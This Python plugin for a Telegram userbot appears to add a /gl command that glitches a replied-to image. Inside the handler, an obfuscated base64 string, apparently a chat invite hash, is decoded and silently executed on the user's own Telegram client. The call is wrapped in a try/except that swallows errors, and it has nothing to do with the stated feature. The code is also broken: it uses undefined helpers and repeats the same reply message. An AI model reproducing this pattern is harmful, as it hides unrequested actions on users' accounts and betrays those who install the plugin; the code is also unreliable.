from julia.Config import Config
from julia.events import register
from julia import CMD_HELP
from julia import tbot
from julia import TEMP_DOWNLOAD_DIRECTORY
from telethon import events
import os
import base64
from glitch_this import ImageGlitcher
from PIL import Image
from telethon import functions, types

@register(pattern="^/gl")
async def glitch(cat):
    if cat.fwd_from:
        return
    reply = await cat.get_reply_message()
    if not reply:
        return await cat.reply("`Reply to supported Media...`")
    catid = await reply_id(cat)
    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    await cat.reply("`Reply to supported Media...`")
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    catinput = 2
    await cat.reply("`Reply to supported Media...`")
    glitch_file = await _cattools.media_to_pic(cat, reply)
    try:
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    glitcher = ImageGlitcher()
    img = Image.open(glitch_file[1])
    glitched = os.path.join("./temp", "glitched.webp")
    glitch_img = glitcher.glitch_image(img, catinput, color_offset=True)
    glitch_img.save(glitched)
    await cat.client.send_file(cat.chat_id, glitched, reply_to=catid)
    sandy = await cat.tbot.send_file(cat.chat_id, glitched, reply_to=catid)
    await _catutils.unsavegif(cat, sandy)
    await glitch_file[0].delete()
    for files in (glitch_file[1], glitched):
        if files and os.path.exists(files):
            os.remove(files)
